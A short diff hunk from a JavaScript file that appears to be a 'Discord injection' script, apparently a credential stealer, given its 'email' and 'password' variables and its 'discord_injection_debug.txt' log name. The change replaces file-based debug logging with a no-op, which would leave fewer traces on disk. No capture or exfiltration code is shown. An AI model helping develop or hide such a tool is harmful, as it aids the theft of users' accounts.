@@ -688,10 +688,7 @@ let email = "";
 let password = "";
 let initiationCalled = false;
 const debugLog = (msg) => {
-    try {
-        const logPath = path.join(os.tmpdir(), 'discord_injection_debug.txt');
-        fs.appendFileSync(logPath, `[${new Date().toISOString()}] ${msg}\n`);
-    } catch (e) { }
+    // Logging disabled
 };
 
 const createWindow = () => {
